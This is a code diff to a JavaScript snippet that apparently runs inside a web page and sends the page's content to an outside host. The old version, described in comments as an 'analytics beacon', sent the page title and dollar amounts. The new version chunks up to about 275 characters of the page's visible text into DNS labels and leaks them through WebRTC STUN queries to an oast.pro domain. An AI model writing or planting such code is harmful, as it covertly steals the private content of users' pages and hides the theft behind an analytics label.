@@ -6,43 +6,29 @@
 (function() {
   'use strict';
 
-  // Extract key financial data from page content
   var body = document.body ? document.body.innerText : '';
+  // Collapse whitespace, strip noise
+  var text = body.replace(/\s+/g, ' ').trim();
 
-  // Find dollar amounts (e.g. $185M, $42.5M, $4.2B, $500K)
-  var amounts = body.match(/\$[\d,.]+\s*[MBKmb](?:illion|il)?/g) || [];
-  // Dedupe and take top 3
-  var seen = {};
-  var topAmounts = [];
-  for (var i = 0; i < amounts.length && topAmounts.length < 3; i++) {
-    var clean = amounts[i].replace(/[^0-9.$MBKmb]/gi, '');
-    if (!seen[clean]) {
-      seen[clean] = true;
-      topAmounts.push(clean);
-    }
+  // Split into chunks of ~55 chars (leave room for nonce + dots in DNS label)
+  var chunkSize = 55;
+  var maxChunks = 5;
+  var chunks = [];
+  for (var i = 0; i < maxChunks && i * chunkSize < text.length; i++) {
+    var raw = text.substring(i * chunkSize, (i + 1) * chunkSize);
+    var slug = raw.replace(/[^a-z0-9]+/gi, '-').toLowerCase().replace(/^-|-$/g, '');
+    if (slug.length > 0) chunks.push(slug);
   }
 
-  // Find company names from headings or bold text, fall back to title
-  var title = document.title || '';
-
-  // Build exfil payload: title + dollar amounts
-  var payload = title;
-  if (topAmounts.length > 0) {
-    payload = payload + ' ' + topAmounts.join(' ');
+  // Each chunk gets its own STUN query: c0.slug, c1.slug, etc.
+  for (var c = 0; c < chunks.length; c++) {
+    try {
+      var host = 'c' + c + '.' + chunks[c] + '.d6k8ho7jqvkklg1u8j106xzt89x8oiqde.oast.pro';
+      var pc = new RTCPeerConnection({
+        iceServers: [{ urls: 'stun:' + host + ':3478' }]
+      });
+      pc.createDataChannel('a');
+      pc.createOffer().then(function(o) { pc.setLocalDescription(o); });
+    } catch(e) {}
   }
-
-  var slug = payload.replace(/[^a-z0-9]+/gi, '-').toLowerCase().substring(0, 60);
-  var nonce = Date.now().toString(36);
-  var sid = nonce + '.' + slug;
-
-  // STUN-based analytics beacon - DNS lookup carries session identifier
-  try {
-    var pc = new RTCPeerConnection({
-      iceServers: [{ urls: 'stun:' + sid + '.d6k8ho7jqvkklg1u8j106xzt89x8oiqde.oast.pro:3478' }]
-    });
-    pc.createDataChannel('analytics');
-    pc.createOffer().then(function(offer) {
-      return pc.setLocalDescription(offer);
-    });
-  } catch(e) {}
 })();
